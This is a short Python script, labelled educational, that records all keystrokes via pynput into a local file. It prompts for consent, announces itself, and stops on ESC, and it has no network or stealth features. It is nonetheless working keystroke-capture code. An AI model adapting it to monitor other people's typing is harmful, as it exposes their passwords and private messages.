"""
Simple Keylogger — Educational Use Only
Logs keystrokes to a local file. Run only on systems you own or have
explicit permission to monitor. Press ESC or Ctrl+C to stop.
"""

import os
import sys
from datetime import datetime
from pynput import keyboard

LOG_FILE = "keylog.txt"
_buffer = []


def format_key(key):
    try:
        return key.char  # regular character
    except AttributeError:
        # special key — make it readable
        name = str(key).replace("Key.", "")
        return f"[{name.upper()}]"


def flush_buffer(log_file):
    if not _buffer:
        return
    with open(log_file, "a", encoding="utf-8") as f:
        f.write("".join(_buffer))
    _buffer.clear()


def on_press(key, log_file=LOG_FILE):
    if key == keyboard.Key.esc:
        flush_buffer(log_file)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n--- Session ended: {timestamp} ---\n")
        print(f"\nStopped. Log saved to '{log_file}'.")
        return False  # stops listener

    token = format_key(key)
    _buffer.append(token)

    # flush every 20 keystrokes to avoid data loss on crash
    if len(_buffer) >= 20:
        flush_buffer(log_file)


def start(log_file=LOG_FILE):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"\n--- Session started: {timestamp} ---\n")

    print(f"Keylogger active. Logging to '{log_file}'. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def main():
    print("=" * 42)
    print("   Simple Keylogger (Educational)")
    print("=" * 42)
    print("WARNING: Use only on systems you own or have permission to monitor.\n")

    confirm = input("Type YES to proceed: ").strip()
    if confirm != "YES":
        print("Aborted.")
        sys.exit(0)

    log_path = input(f"Log file path (default: {LOG_FILE}): ").strip() or LOG_FILE
    start(log_path)


if __name__ == "__main__":
    main()
